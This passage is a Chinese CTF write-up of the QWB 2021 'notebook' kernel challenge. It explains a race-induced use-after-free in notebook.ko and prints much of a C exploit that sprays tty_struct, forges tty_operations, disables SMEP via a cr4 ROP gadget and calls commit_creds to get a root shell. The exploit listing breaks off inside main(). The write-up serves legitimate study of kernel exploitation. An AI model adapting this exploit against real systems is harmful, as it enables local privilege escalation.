### 0x00 逆向分析
​ 题目给了有漏洞的内核模块 `notebook.ko`，内核保护 KASLR、SMAP、SMEP、KPTI 全开。
​ `notebook.ko` 给了 4 个功能 `noteadd`、`notedel`、`noteedit`、`notegift`，加上读写
`mynote_read`、`mynote_write` 一共 6 种操作。
​ 乍看之下好像没什么明显的溢出漏洞，但是 lock 操作显得有些突兀。Google 一下 `lock` 和 `copy_from/to_user` 发现
`copy_from/to_user` 可能引发缺页中断（从而导致进程调度），不能在自旋锁的临界区使用。
​ 所以可能就有这样一条链来通过条件竞争来构造:
  1. 通过 `noteadd` 分配一个 0x20 大小的 slub 块。
  2. 再次执行 `noteadd` ，size 为 0x60，不过这次我们在 `copy_from_user` 时让他卡住。这样在`mynote_write` 的时候就能向我们第一次分配的 0x20 的块内写入 0x60 的数据。
但是实际情况是 `raw_read_lock` 没有办法构造我们希望的死锁。需要另想办法。
### 0x01 Race Condition
​ 看到题目给的 qemu 的启动命令，是有 `-smp cores=2,threads=2` 的。所以考虑利用 `copy_from_user`
导致的缺页中断来条件竞争。`userfaultfd` 可以很好的劫持掉缺页的处理，也可以用风水式的硬竞争来爆这个竞争窗口 (will 解法)。
​ 在 `noteedit` 函数中，`krealloc` 把原来的块 `kfree` 掉并分配一个新块。如果在 `copy_from_user`
断下来，`notebook->note` 还没来得及更新，就产生了一个可以利用的 UAF 了。常规的解法思路就是利用这个 UAF 去喷
`tty_struct`。
### 0x02 利用
​ 这里介绍四种利用姿势，分别是队里 will 师傅的解法、X1cT34m 战队的解法、L-team 战队的解法、长亭师傅的解法。除了 X1cT34m
外，其他的三种解法思路都一样，只是竞争获取 UAF 的方式有差别。
​ 这里只放上 will 的 exp，L-team 战队 exp 见 [[强网杯2021-线上赛] Pwn方向writeup By
L-team](https://eqqie.cn/index.php/laji_note/1662/)，长亭师傅的 exp 见 [第五届强网杯线上赛冠军队
WriteUp - Pwn 篇](https://www.chainnews.com/articles/777744778306.htm)，X1cT34m
的 exp 见 [强网杯2021 Writeup by X1cT34m](https://ctf.njupt.edu.cn/627.html)。
#### exp1
​ 分步骤解析一下 will 的利用:
  1. 通过很多次抢占竞争窗口，获得 `notebook` 上两个一样的 `note` 地址。
  2. `free` 掉其中一个 `note` 产生 UAF，并用 `tty_struct` 来喷射这个被 `free` 的 slub 块。
  3. 通过 `tty_struct` 中的虚表地址泄露内核基地址，然后劫持虚表，进行内核 ROP。
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define __USE_GNU
    #include 
    #include 
    #include 
    #include 
    #include 
    #define uint64_t u_int64_t
    #define CRED_MAGIC 0x43736564
    #define CRED_MAGIC_DEAD 0x44656144
    #define MAP_ADDR 0x1000000
    #define TTY_STRUCT_SIZE 0x2e0
    #define SPRAY_ALLOC_TIMES 0x100
    int spray_fd[0x100];
    struct tty_operations {
        struct tty_struct * (*lookup)(struct tty_driver *driver,
        struct file *filp, int idx);
        int (*install)(struct tty_driver *driver, struct tty_struct *tty);
        void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
        int (*open)(struct tty_struct * tty, struct file * filp);
        void (*close)(struct tty_struct * tty, struct file * filp);
        void (*shutdown)(struct tty_struct *tty);
        void (*cleanup)(struct tty_struct *tty);
        int (*write)(struct tty_struct * tty,
        const unsigned char *buf, int count);
        int (*put_char)(struct tty_struct *tty, unsigned char ch);
        void (*flush_chars)(struct tty_struct *tty);
        int (*write_room)(struct tty_struct *tty);
        int (*chars_in_buffer)(struct tty_struct *tty);
        int (*ioctl)(struct tty_struct *tty,
        unsigned int cmd, unsigned long arg);
        long (*compat_ioctl)(struct tty_struct *tty,
        unsigned int cmd, unsigned long arg);
        void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
        void (*throttle)(struct tty_struct * tty);
        void (*unthrottle)(struct tty_struct * tty);
        void (*stop)(struct tty_struct *tty);
        void (*start)(struct tty_struct *tty);
        void (*hangup)(struct tty_struct *tty);
        int (*break_ctl)(struct tty_struct *tty, int state);
        void (*flush_buffer)(struct tty_struct *tty);
        void (*set_ldisc)(struct tty_struct *tty);
        void (*wait_until_sent)(struct tty_struct *tty, int timeout);
        void (*send_xchar)(struct tty_struct *tty, char ch);
        int (*tiocmget)(struct tty_struct *tty);
        int (*tiocmset)(struct tty_struct *tty,
        unsigned int set, unsigned int clear);
        int (*resize)(struct tty_struct *tty, struct winsize *ws);
        int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
        int (*get_icount)(struct tty_struct *tty,
        struct serial_icounter_struct *icount);
        const struct file_operations *proc_fops;
    };
    typedef int __attribute__((regparm(3)))(*_commit_creds)(unsigned long cred);
    typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);
    _commit_creds commit_creds = (_commit_creds) 0xffffffff810a1420;
    _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred) 0xffffffff810a1810;
    size_t commit_creds_addr=0, prepare_kernel_cred_addr=0;
    void get_root() {
        commit_creds(prepare_kernel_cred(0));
    }
    unsigned long user_cs;
    unsigned long user_ss;
    unsigned long user_sp;
    unsigned long user_rflags;
    static void save_state()
    {
        asm(
            "movq %%cs, %0\n"
            "movq %%ss, %1\n"
            "movq %%rsp, %2\n"
            "pushfq\n"
            "popq %3\n"
            : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
            :
            : "memory");
    }
    static void win() {
      char *argv[] = {"/bin/sh", NULL};
      char *envp[] = {NULL};
      puts("[+] Win!");
      execve("/bin/sh", argv, envp);
    }
    typedef struct userarg{
        uint64_t idx;
        uint64_t size;
        char* buf;
    }Userarg;
    typedef struct node{
        uint64_t note;
        uint64_t size;
    }Node;
    Userarg arg;
    Node note[0x10];
    uint64_t ko_base = 0;
    char buf[0x1000] = {0};
    int gift(uint64_t fd,char* buf){
        memset(&arg, 0, sizeof(Userarg));
        memset(buf, 0xcc, 0);
        arg.buf = buf;
        return ioctl(fd,100,&arg);
    }
    int add(uint64_t fd,uint64_t idx,uint64_t size,char* buf){
        memset(&arg, 0, sizeof(Userarg));
        arg.idx = idx;
        arg.size = size;
        arg.buf = buf;
        return ioctl(fd,0x100,&arg);
    }
    int del(uint64_t fd,uint64_t idx){
        memset(&arg, 0, sizeof(Userarg));
        arg.idx = idx;
        return ioctl(fd,0x200,&arg);
    }
    int edit(uint64_t fd,uint64_t idx,uint64_t size,char* buf){
        memset(&arg, 0, sizeof(Userarg));
        arg.idx = idx;
        arg.size = size;
        arg.buf = buf;
        return ioctl(fd,0x300,&arg);
    }
    size_t find_symbols()
    {
        int kallsyms_fd = open("/tmp/moduleaddr", O_RDONLY);
        if(kallsyms_fd < 0)
        {
            puts("[*]open kallsyms error!");
            exit(0);
        }
        read(kallsyms_fd,buf,24);
        char hex[20] = {0};
        read(kallsyms_fd,hex,18);
        sscanf(hex, "%llx", &ko_base);
        printf("ko_base addr: %#lx\n", ko_base);
    }
    size_t vmlinux_base = 0;
    size_t raw_vmlinux_base = 0xffffffff81000000;
    size_t raw_do_tty_hangup = 0xffffffff815af980; 
    size_t raw_commit_creds = 0xffffffff810a9b40; 
    size_t raw_prepare_kernel_cred = 0xffffffff810a9ef0;
    size_t raw_regcache_mark_dirty = 0xffffffff816405b0;
    size_t raw_x64_sys_chmod = 0xffffffff81262280;
    size_t raw_msleep = 0xffffffff81102360;
    size_t raw_pop_rdi = 0xffffffff81007115; //pop rdi; ret;
    size_t raw_pop_rdx = 0xffffffff81358842; //pop rdx; ret;
    size_t raw_pop_rcx = 0xffffffff812688f3; //pop rcx; ret;
    //0xffffffff8250747f : mov rdi, rax ; call rdx
    //0xffffffff8147901d : mov rdi, rax ; ja 0xffffffff81479013 ; pop rbp ; ret
    //size_t raw_mov_rdi_rax = 0xffffffff8195d1c2; //mov rdi, rax; cmp r8, rdx; jne 0x2cecb3; ret; 
    size_t raw_mov_rdi_rax = 0xffffffff8147901d;
    size_t raw_pop_rax = 0xffffffff81540d04;//pop rax; ret;
    size_t raw_mov_rdi_rbx = 0xffffffff824f6a4c; //mov rdi, rbx; call rax;
    size_t raw_pop_rsi = 0xffffffff8143438e; //pop rsi; ret;
    size_t raw_push_rax =  0xffffffff81035b63;//push rax; ret;
    size_t raw_pop_rdi_call = 0xffffffff81f0b51c; //pop rdi; call rcx;
    size_t raw_xchg_eax_esp  = 0xffffffff8101d247;
    //这里注意一定要使用这个gadget去维持栈平衡
    //0xffffffff81063710 : push rbp ; mov rbp, rsp ; mov cr4, rdi ; pop rbp ; ret
    size_t raw_mov_cr4_rdi = 0xffffffff81063710;
    size_t base_add(size_t addr){
        return addr - raw_vmlinux_base + vmlinux_base;
    }
    int main()
    {
        find_symbols();
        int fd = open("/dev/notebook", O_RDWR);
        if (fd < 0)
        {
            puts("[*]open notebook error!");
            exit(0);
        }
        struct tty_operations *fake_tty_operations = (struct tty_operations *)malloc(sizeof(struct tty_operations));
        save_state();
        memset(fake_tty_operations, 0, sizeof(struct tty_operations));
    START:
        for (int i = 0; i < 0x10; i++)
        {
            del(fd,i);
        }
        //偶数id 用来申请0x2e0的chunk
        for (int i = 0; i < 0x10; i+=2)
        {
            edit(fd, i, 0x2e0, "will");   
        }    
        pid_t pid = fork();
        if (!pid)
        {
            sleep(1);
            for (int i = 0; i < 0x10; i+=2)
            {
                edit(fd, i, 0, 0);  //triggle sleep from page fault
                sleep(0.1);
            }
            return 0;
        }